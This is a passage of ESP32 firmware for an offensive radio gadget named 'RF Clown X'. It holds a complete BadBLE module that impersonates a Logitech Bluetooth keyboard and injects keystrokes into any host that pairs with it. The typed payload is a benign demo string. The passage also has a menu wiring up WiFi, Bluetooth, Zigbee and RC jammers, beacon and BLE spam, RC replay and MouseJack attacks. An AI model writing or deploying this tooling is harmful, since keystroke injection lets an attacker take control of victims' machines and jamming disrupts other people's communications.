      if (now - lastDraw >= 300) { lastDraw = now; draw(); }
      toolLEDTick();
    }
  }
  SelectRequested = false; SelectBack = false;
  RadioA.powerDown();
  setRadiosNeutralState();
  update_OLED();
}

// ---------------- BadBLE: BLE HID keyboard (wireless Rubber Ducky) ----------------
// The ESP32 advertises as a Bluetooth LE keyboard. Once a victim pairs/accepts
// it, we send a keystroke payload (HID input reports). Requires the target to
// accept pairing (Just Works). Payload kept benign (types a demo string).
static const uint8_t BADBLE_REPORT_MAP[] = {
  0x05, 0x01,  // Usage Page (Generic Desktop)
  0x09, 0x06,  // Usage (Keyboard)
  0xA1, 0x01,  // Collection (Application)
  0x85, 0x01,  //   Report ID (1)
  0x05, 0x07,  //   Usage Page (Key Codes)
  0x19, 0xE0, 0x29, 0xE7,  // Usage Min/Max (modifier keys)
  0x15, 0x00, 0x25, 0x01,  // Logical Min/Max (0/1)
  0x75, 0x01, 0x95, 0x08,  // Report Size 1, Count 8
  0x81, 0x02,              // Input (Data,Var,Abs) -> modifier byte
  0x95, 0x01, 0x75, 0x08,  // Report Count 1, Size 8
  0x81, 0x03,              // Input (Const) -> reserved byte
  0x95, 0x06, 0x75, 0x08,  // Report Count 6, Size 8
  0x15, 0x00, 0x25, 0x65,  // Logical Min/Max (0/101)
  0x05, 0x07, 0x19, 0x00, 0x29, 0x65,  // Usage Min/Max
  0x81, 0x00,              // Input (Data,Array) -> 6 key bytes
  0xC0                     // End Collection
};

static volatile bool gBadBleConnected = false;
class BadBleServerCb : public BLEServerCallbacks {
  void onConnect(BLEServer*) override    { gBadBleConnected = true; }
  void onDisconnect(BLEServer*) override { gBadBleConnected = false; }
};

static uint8_t badbleKey(char c, uint8_t &mod) {
  mod = 0;
  if (c >= 'a' && c <= 'z') return 0x04 + (c - 'a');
  if (c >= 'A' && c <= 'Z') { mod = 0x02; return 0x04 + (c - 'A'); }
  if (c >= '1' && c <= '9') return 0x1e + (c - '1');
  if (c == '0') return 0x27;
  if (c == ' ') return 0x2c;
  if (c == '-') return 0x2d;
  if (c == '.') return 0x37;
  if (c == '\n') return 0x28;
  return 0;
}

static void badbleType(BLECharacteristic* input, const char* s) {
  for (const char* p = s; *p; p++) {
    uint8_t mod, key = badbleKey(*p, mod);
    uint8_t rpt[8] = {mod, 0, key, 0, 0, 0, 0, 0};
    input->setValue(rpt, 8); input->notify(); delay(14);
    uint8_t rel[8] = {0, 0, 0, 0, 0, 0, 0, 0};
    input->setValue(rel, 8); input->notify(); delay(14);
  }
}

static void openBadBle() {
  gBadBleConnected = false;
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;

  BLEDevice::init("Wireless Keyboard");
  BLEServer* server = BLEDevice::createServer();
  if (server == nullptr) {                          // BLE failed to (re)initialize
    scannerMessage("BLE init failed");
    delay(1200);
    BLEDevice::deinit(false);
    update_OLED();
    return;
  }
  server->setCallbacks(new BadBleServerCb());
  BLEHIDDevice* hid = new BLEHIDDevice(server);
  BLECharacteristic* input = hid->inputReport(1);
  hid->manufacturer()->setValue("Logitech");
  hid->pnp(0x02, 0x046d, 0xc52b, 0x0001);
  hid->hidInfo(0x00, 0x01);
  hid->reportMap((uint8_t*)BADBLE_REPORT_MAP, sizeof(BADBLE_REPORT_MAP));
  hid->startServices();
  hid->setBatteryLevel(100);

  BLESecurity* sec = new BLESecurity();
  sec->setAuthenticationMode(ESP_LE_AUTH_REQ_SC_BOND);
  sec->setCapability(ESP_IO_CAP_NONE);
  sec->setInitEncryptionKey(ESP_BLE_ENC_KEY_MASK | ESP_BLE_ID_KEY_MASK);

  BLEAdvertising* adv = BLEDevice::getAdvertising();
  adv->setAppearance(0x03C1);                       // HID keyboard
  adv->addServiceUUID(hid->hidService()->getUUID());
  adv->setScanResponse(true);
  BLEDevice::startAdvertising();

  const char* payload = "RF Clown X BadBLE test ";
  bool typed = false;
  unsigned long connAt = 0, lastDraw = 0;

  while (!SelectBack) {
    if (SelectRequested) { SelectRequested = false; typed = false; connAt = 0; }  // re-send
    if (gBadBleConnected) {
      if (connAt == 0) connAt = millis();
      if (!typed && millis() - connAt > 1500) { badbleType(input, payload); typed = true; }
    } else { connAt = 0; }

    unsigned long now = millis();
    if (now - lastDraw >= 300) {
      lastDraw = now;
      u8g2.clearBuffer();
      u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
      u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
      u8g2.drawStr(PAD, 2, "BadBLE");
      u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
      u8g2.setDrawColor(1); u8g2.setFont(FONT_SMALL);
      u8g2.setCursor(2, HEADER_H + 3);
      u8g2.print(gBadBleConnected ? "Paired!" : "Advertising as kbd");
      u8g2.setCursor(2, HEADER_H + 15);
      u8g2.print("Name: Wireless Kbd");
      u8g2.setCursor(2, HEADER_H + 27);
      u8g2.print(typed ? "Payload sent" : (gBadBleConnected ? "Sending..." : "Pair from target"));
      u8g2.setCursor(2, HEADER_H + 40);
      u8g2.print("S:resend  hold:back");
      u8g2.sendBuffer();
    }
    toolLEDTick();
    delay(30);
  }
  SelectRequested = false; SelectBack = false;
  BLEDevice::deinit(false);
  update_OLED();
}

typedef void (*ToolFn)();
struct MenuItem { const char* label; ToolFn fn; const byte* ch; uint8_t n; };
struct MenuCat  { const char* name; const MenuItem* items; uint8_t count; };

static const MenuItem jammerItems[] = {
  {"WiFi",         nullptr, WiFi_channels,             sizeof(WiFi_channels)},
  {"Video TX",     nullptr, videoTransmitter_channels, sizeof(videoTransmitter_channels)},
  {"RC",           nullptr, rc_channels,               sizeof(rc_channels)},
  {"BLE",          nullptr, ble_channels,              sizeof(ble_channels)},
  {"Bluetooth",    nullptr, bluetooth_channels,        sizeof(bluetooth_channels)},
  {"USB Wireless", nullptr, usbWireless_channels,      sizeof(usbWireless_channels)},
  {"Zigbee",       nullptr, zigbee_channels,           sizeof(zigbee_channels)},
  {"NRF24",        nullptr, nrf24_channels,            sizeof(nrf24_channels)},
};
static const MenuItem scannerItems[] = {
  {"WiFi Scan", openWiFiScan,   nullptr, 0},
  {"BLE Scan",  openBLEScan,    nullptr, 0},
  {"AirTag",    openAirtagScan, nullptr, 0},
  {"Spectrum",  openSpectrum,   nullptr, 0},
};
static const MenuItem attackItems[] = {
  {"AP Spam",    openBeaconSpam, nullptr, 0},
  {"Clone Spam", openCloneSpam,  nullptr, 0},
  {"BLE Spam",   openBleSpam,    nullptr, 0},
  {"RC Replay",  openRcReplay,   nullptr, 0},
  {"MouseJack",  openMouseJack,  nullptr, 0},
  {"BadBLE",     openBadBle,     nullptr, 0},
};
static const MenuItem gameItems[] = {
  {"Snake", openSnake, nullptr, 0},
};
static void drawRemoteApScreen() {
  bool on = webuiIsEnabled();
  u8g2.clearBuffer();
  drawHeaderBar();
  u8g2.setFont(FONT_MEDIUM);
  u8g2.setCursor(PAD, HEADER_H + 4);
  u8g2.print("Remote AP");
  u8g2.setFont(FONT_SMALL);
  u8g2.setCursor(PAD, 32); u8g2.print(on ? "STATE: ON" : "STATE: OFF");
  u8g2.setCursor(PAD, 44); u8g2.print(on ? "192.168.4.1" : "no network");
  u8g2.setCursor(PAD, 56); u8g2.print("L/R:toggle hold:save");
  u8g2.sendBuffer();
  webuiSnapshot();          // mirror the toggle screen on the phone too
}

static void openRemoteAp() {
  ChangeRequested = false; ChangeRequested1 = false; SelectRequested = false; SelectBack = false;
  drawRemoteApScreen();
  while (!SelectBack) {
    if (ChangeRequested || ChangeRequested1) {
      ChangeRequested = false; ChangeRequested1 = false;
      webuiSetEnabled(!webuiIsEnabled());
      drawRemoteApScreen();
    }
    delay(20);
  }
  SelectRequested = false; SelectBack = false;
  webuiPersistEnabled(webuiIsEnabled());   // remembered across reboots
  update_OLED();
}

static const MenuItem systemItems[] = {
  {"Brightness", openBrightnessMenu, nullptr, 0},
  {"System",     openSystemInfo,     nullptr, 0},
  {"Radio Test", openRadioTest,      nullptr, 0},
  {"Back Time",  openHoldTime,       nullptr, 0},
  {"Remote AP",  openRemoteAp,       nullptr, 0},
  {"About",      openAbout,          nullptr, 0},
};
static const MenuCat gCats[] = {
  {"Jammers",  jammerItems,  8},
  {"Scanners", scannerItems, 4},
  {"Attacks",  attackItems,  6},
  {"Games",    gameItems,    1},
  {"System",   systemItems,  6},
};
static const int gNCat = sizeof(gCats) / sizeof(gCats[0]);

static int gCatSel  = 0;   // selected category
static int gItemSel = 0;   // selected item within category
static int gLevel   = 0;   // 0 = categories, 1 = items

static void drawMenu() {
  u8g2.clearBuffer();
  u8g2.setDrawColor(1); u8g2.drawBox(0, 0, 128, HEADER_H);
  u8g2.setDrawColor(0); u8g2.setFont(FONT_SMALL);
  if (gLevel == 0) {
    u8g2.drawStr(PAD, 2, "RF Clown X");
    u8g2.drawStr(128 - u8g2.getStrWidth("S:open") - 3, 2, "S:open");
  } else {
    u8g2.drawStr(PAD, 2, gCats[gCatSel].name);
    u8g2.drawStr(128 - u8g2.getStrWidth("hold:back") - 3, 2, "hold:back");
  }
  u8g2.setDrawColor(1);
  const int rowH = 12, rows = 4;
  int count = (gLevel == 0) ? gNCat : gCats[gCatSel].count;
  int sel   = (gLevel == 0) ? gCatSel : gItemSel;
  int startIdx = (sel / rows) * rows;
  for (int r = 0; r < rows; r++) {
    int idx = startIdx + r;
    if (idx >= count) break;
    int y = HEADER_H + 2 + r * rowH;
    if (idx == sel) { u8g2.setDrawColor(1); u8g2.drawBox(0, y - 1, 128, rowH); u8g2.setDrawColor(0); }
    else u8g2.setDrawColor(1);
    u8g2.setFont(FONT_SMALL);
    const char* label = (gLevel == 0) ? gCats[idx].name : gCats[gCatSel].items[idx].label;
    u8g2.setCursor(4, y);
    u8g2.print(label);
    if (gLevel == 0) { u8g2.setCursor(120, y); u8g2.print(">"); }
  }
  u8g2.setDrawColor(1);
  u8g2.sendBuffer();
}

// ---------------- Remote WebUI bridge ----------------
// The menu tables are file-static, so the web layer talks to them through here.
int         webMenuCatCount()              { return gNCat; }
const char* webMenuCatName(int c)          { return gCats[c].name; }
int         webMenuItemCount(int c)        { return gCats[c].count; }
const char* webMenuItemLabel(int c, int i) { return gCats[c].items[i].label; }

void webMenuState(int& level, int& cat, int& item) {
  level = gLevel; cat = gCatSel; item = gItemSel;
}

void webSetBrightness(uint8_t b) { applyBrightness(b); saveBrightness(); }

// Runs a launcher request on the main task, exactly like a physical SELECT.
void webMenuExec(int c, int i) {
  if (c < 0 || c >= gNCat || i < 0 || i >= gCats[c].count) return;
  gCatSel = c; gItemSel = i; gLevel = 1;
  drawMenu();
  const MenuItem& it = gCats[c].items[i];
  webuiToolEnter(it.label);
  setNeoPixelColour("green");
  if (it.fn) it.fn(); else openJammer(it.label, it.ch, it.n);
  setNeoPixelColour("blue");
  webuiToolExit();
  SelectRequested = false; SelectBack = false;
  drawMenu();
  webuiSnapshot();
}

void setup() {
  Serial.begin(115200);
  Wire.begin();
  Wire.setClock(400000);
  u8g2.begin();
  u8g2.setBusClock(400000);
  u8g2.setFont(FONT_SMALL);
  u8g2.setDrawColor(1);
  u8g2.setFontPosTop();
  u8g2.enableUTF8Print();   // decode UTF-8 so SSIDs with accents (e.g. ñ) render correctly
  loadBrightness();
  loadHoldTime();
  esp_bt_controller_deinit();
  esp_wifi_stop();
  esp_wifi_deinit();
  esp_wifi_disconnect();

  // NeoPixel status LED
  pixels.begin();
  pixels.clear();
  pixels.show();

  pinMode(PIN_BTN_L,  INPUT_PULLUP);
  pinMode(PIN_BTN_R, INPUT_PULLUP);
  pinMode(PIN_BTN_S, INPUT_PULLUP);
  attachInterrupt(digitalPinToInterrupt(PIN_BTN_L),  handleButton,  FALLING);
  attachInterrupt(digitalPinToInterrupt(PIN_BTN_R), handleButton1, FALLING);
  attachInterrupt(digitalPinToInterrupt(PIN_BTN_S), handleButton2, CHANGE);

  // Configure the radios but leave them powered down so the device does not
  // jam on boot while still in standby (DEACTIVE) mode.
  initAllRadios();
  setRadiosNeutralState();

  conf();
  setNeoPixelColour("blue");
  update_OLED();

  webuiBegin();      // SoftAP + HTTP task on core 0 (non-blocking)
  webuiSnapshot();
}

void loop() {
  { int pc, pi; if (webuiTakeExec(pc, pi)) webMenuExec(pc, pi); }

  if (ChangeRequested) {
    ChangeRequested = false;
    if (gLevel == 0) gCatSel = (gCatSel == 0) ? gNCat - 1 : gCatSel - 1;
    else { int c = gCats[gCatSel].count; gItemSel = (gItemSel == 0) ? c - 1 : gItemSel - 1; }
    drawMenu();
  }
  if (ChangeRequested1) {
    ChangeRequested1 = false;
    if (gLevel == 0) gCatSel = (gCatSel + 1) % gNCat;
    else { int c = gCats[gCatSel].count; gItemSel = (gItemSel + 1) % c; }
    drawMenu();
  }
  if (SelectBack) {
    SelectBack = false;
    SelectRequested = false;          // drop any bounce companion so back wins
    if (gLevel == 1) { gLevel = 0; drawMenu(); }
  }
  if (SelectRequested) {
    SelectRequested = false;
    if (gLevel == 0) {
      gLevel = 1; gItemSel = 0; drawMenu();
    } else {
      const MenuItem &it = gCats[gCatSel].items[gItemSel];
      setNeoPixelColour("green");
      webuiToolEnter(it.label);          // arms the failsafe + status label
      if (it.fn) it.fn();
      else       openJammer(it.label, it.ch, it.n);
      setNeoPixelColour("blue");
      webuiToolExit();                   // restores the AP if the tool killed Wi-Fi
      SelectRequested = false; SelectBack = false;   // ignore stray edges after a tool
      drawMenu();
    }
  }
  webuiSnapshot();
  delay(10);
}
